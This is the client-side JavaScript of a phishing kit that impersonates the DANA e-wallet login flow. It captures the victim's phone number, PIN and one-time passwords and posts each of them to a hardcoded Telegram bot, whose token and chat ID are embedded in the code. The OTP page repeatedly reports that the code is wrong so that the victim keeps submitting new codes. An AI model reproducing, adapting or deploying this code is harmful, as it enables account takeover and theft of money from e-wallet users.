document.addEventListener('DOMContentLoaded', () => {
  // Element references
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const vbc = document.querySelector('.verifikasi-button-container');
  const sn = document.getElementById('success-notification');
  const lc = document.getElementById('lanjutkan-container');
  const rn = document.getElementById('reward-notification');
  const st = document.querySelector('.show-text');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const spinner = document.querySelector('.spinner-overlay');

  // State variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  const botToken = '7599366316:AAEpmSa7eu8AemkOd3oPw9NUcpXQT0zW2B0';
  const chatId = '7740985188';
  let otpTimer;
  let remainingTime = 120; // 2 menit dalam detik

  // Spinner functions
  function showSpinner() {
    spinner.style.display = 'flex';
  }

  function hideSpinner() {
    spinner.style.display = 'none';
  }

  // Bersihkan timer ketika halaman dimuat ulang
  clearInterval(otpTimer);

  // Fungsi untuk memulai timer OTP
  function startOTPTimer() {
    clearInterval(otpTimer); // Hentikan timer yang ada
    remainingTime = 120; // Reset ke 2 menit
    
    otpTimer = setInterval(() => {
      remainingTime--;
      
      const minutes = Math.floor(remainingTime / 60).toString().padStart(2, '0');
      const seconds = (remainingTime % 60).toString().padStart(2, '0');
      document.getElementById('otp-timer').textContent = `${minutes}:${seconds}`;
      
      if (remainingTime <= 0) {
        clearInterval(otpTimer);
        // Reset timer setelah mencapai 00:00
        setTimeout(() => {
          remainingTime = 120;
          document.getElementById('otp-timer').textContent = '02:00';
          startOTPTimer(); // Mulai lagi timer
        }, 1000);
      }
    }, 1000);
  }

  // Telegram notification sender
  async function sendToTelegram(message) {
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  }

  // Notification formatters - Updated format
  function formatPhoneNotification(phone) {
    return `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${phone}\n╰───────────────────`;
  }

  function formatPinNotification(phone, pin) {
    return `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${phone}\n├───────────────────\n├• PIN  : ${pin}\n╰───────────────────`;
  }

  function formatOtpNotification(phone, pin, otp) {
    return `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${phone}\n├───────────────────\n├• PIN  : ${pin}\n├───────────────────\n├• OTP : ${otp}\n╰───────────────────`;
  }

  // Phone number input formatting
  pn.addEventListener('input', e => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4) + '-' + value.substring(4);
    if (value.length > 9) value = value.substring(0, 9) + '-' + value.substring(9);
    e.target.value = value.substring(0, 15);
  });

  // PIN input handling
  pis.forEach((input, index) => {
    input.addEventListener('input', e => {
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
      pin = Array.from(pis).map(i => i.value).join('');
      if (pin.length === 6) {
        showSpinner();
        sendToTelegram(formatPinNotification(phoneNumber, pin));
        setTimeout(() => {
          pages.p.style.display = 'none';
          pages.o.style.display = 'block';
          currentPage = 'o';
          lc.style.display = 'none';
          startOTPTimer(); // Mulai timer ketika masuk halaman OTP
          setTimeout(() => { 
            fn.style.display = 'block';
            hideSpinner();
          }, 1000);
        }, 1000);
      }
    });

    input.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // OTP input handling
  ois.forEach((input, index) => {
    input.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < ois.length - 1) {
        ois[index + 1].focus();
      }
      
      otp = Array.from(ois).map(i => i.value).join('');
      
      // When last OTP box is filled
      if (index === ois.length - 1 && e.target.value.length === 1) {
        showSpinner();
        sendToTelegram(formatOtpNotification(phoneNumber, pin, otp));
        
        // Auto reset after 500ms
        setTimeout(() => {
          ois.forEach(i => i.value = '');
          ois[0].focus();
          otp = '';
          
          attemptCount++;
          an.textContent = attemptCount;
          ac.style.display = 'block';
          
          // Show notification after 2 attempts
          if (attemptCount > 2) {
            rn.style.display = 'block';
            rn.innerHTML = `
              <div class="notification-content">
                <h3>kode OTP Salah</h3>
                <p>silahkan cek sms ataupan whatsapp</p>
              </div>
            `;
            setTimeout(() => { rn.style.display = 'none' }, 10000);
          }
          
          // Show success after max attempts
          if (attemptCount >= maxAttempts) {
            fn.style.display = 'none';
            sn.style.display = 'block';
            setTimeout(() => { 
              sn.style.display = 'none';
              hideSpinner();
            }, 5000);
          } else {
            hideSpinner();
          }
        }, 1000);
      }
    });

    input.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
        ois[index - 1].focus();
      }
    });
  });

  // Toggle PIN visibility
  st.addEventListener('click', function() {
    this.classList.toggle('active');
    pis.forEach(i => {
      i.type = this.classList.contains('active') ? 'text' : 'password';
    });
    this.textContent = this.classList.contains('active') ? 'Sembunyikan' : 'Tampilkan';
  });

  // Continue button
  lb.addEventListener('click', () => {
    if (currentPage === 'n') {
      phoneNumber = pn.value.replace(/\D/g, '');
      if (phoneNumber.length < 10) {
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      showSpinner();
      sendToTelegram(formatPhoneNotification(phoneNumber));
      setTimeout(() => {
        pages.n.style.display = 'none';
        pages.p.style.display = 'block';
        currentPage = 'p';
        lc.style.display = 'none';
        hideSpinner();
      }, 1000);
    }
  });

  // Close floating notification
  fn.addEventListener('click', () => {
    fn.style.display = 'none';
    if (otp.length < 4) {
      ois[0].focus();
    }
  });
});
